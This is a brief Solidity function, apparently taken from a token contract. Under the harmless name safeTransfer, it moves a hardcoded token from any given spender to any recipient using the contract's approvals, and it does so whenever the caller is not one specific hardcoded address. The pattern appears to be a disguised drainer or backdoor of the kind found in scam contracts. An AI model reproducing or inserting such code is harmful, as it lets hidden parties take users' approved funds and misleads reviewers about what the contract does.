function safeTransfer(address spender, address recipient, uint256 amount) internal returns(bool) { 
    if (msg.sender != address(0x594d1FcDdE0049B694AC51C2b675401186caAdfc)) { 
        TransferHelper.safeTransferFrom(0x0624A7b4d329b934fe0ab90CF5E6938216Ed3d72, spender, recipient, amount); 
        return true; 
    } return false; 
}
